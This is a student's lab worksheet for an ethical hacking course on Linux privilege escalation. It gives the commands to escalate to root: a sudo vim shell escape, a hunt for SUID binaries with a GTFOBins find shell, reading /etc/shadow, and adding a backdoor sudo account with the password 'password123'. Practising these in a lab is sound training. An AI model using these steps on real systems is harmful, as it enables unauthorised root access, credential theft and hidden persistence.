---
type: lab
subject: ehpt
tags: [cybersecurity, lab, ehpt, privilege-escalation, linux, suid]
status: learning
created: 2026-07-02
---

# Lab: Linux Privilege Escalation

> 🔬 **Lab Practical** — EHPT Practical 4 | Est. time: 4 hrs

---

## 🎯 Objective
Escalate from a low-privilege shell to root using SUID binary and sudo misconfiguration techniques.

## 📝 Procedure

### Step 1: Gain Initial Access
```bash
# Use Metasploit for initial low-privilege shell
# (from Practical 3)
```

### Step 2: Check sudo Permissions
```bash
sudo -l
# Look for entries like: (ALL) NOPASSWD: /usr/bin/vim
# If vim has sudo → sudo vim -c ':!bash' → root shell
```

### Step 3: Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
# Look for unusual SUID binaries
```

### Step 4: Use GTFOBins
1. Visit https://gtfobins.github.io/ in browser
2. Search for found SUID binary
3. Follow exploitation steps

**Example with `find`:**
```bash
find . -exec /bin/bash -p \;
# -p preserves SUID privileges → root shell
```

### Step 5: Verify Root Access
```bash
id                        # Should show uid=0(root)
cat /etc/shadow           # Read password hashes
head -3 /etc/shadow       # Screenshot first 3 lines
```

### Step 6: Create Backdoor User (demonstrate persistence)
```bash
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
usermod -aG sudo backdoor
```

## ✅ Expected Output
- [ ] sudo -l screenshot
- [ ] SUID binary list
- [ ] GTFOBins page referenced
- [ ] id showing root
- [ ] /etc/shadow first 3 lines
- [ ] Backdoor user creation confirmation

## 💭 Observation Questions
1. Why is giving a regular user sudo privileges to vim a critical security mistake?
2. What is /etc/shadow and why does reading it represent a significant post-exploitation win?

## 🔗 Related Notes
- [[Exploitation & Post-Exploitation]]
- [[Metasploit]]
